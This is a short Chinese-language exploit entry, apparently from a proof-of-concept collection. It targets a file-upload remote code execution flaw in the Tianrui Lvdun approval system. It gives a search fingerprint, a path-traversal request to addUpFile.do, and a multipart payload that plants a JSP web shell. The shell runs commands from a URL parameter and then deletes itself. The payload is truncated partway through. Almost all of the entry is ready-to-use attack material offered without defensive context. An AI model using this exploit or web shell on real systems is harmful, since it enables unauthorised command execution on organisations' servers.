# 天锐绿盾审批系统addUpFile.do存在文件上传致RCE漏洞

- **系统**：天锐绿盾　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/file/addUpFile.do HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ89XK7Wx…`

**请求体 / payload**
```
------WebKitFormBoundaryJ89XK7WxiQuU7uq1
Content-Disposition: form-data; name="relativepath"
../../webapps/ROOT/c
------WebKitFormBoundaryJ89XK7WxiQuU7uq1
Content-Disposition: form-data; name="file"; filename="1.jsp"
<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryJ89XK7WxiQuU7uq1
Content-Disposition: form-da…（脚本共 690 字，完整版见原文）
```
- **预期**：200　|　—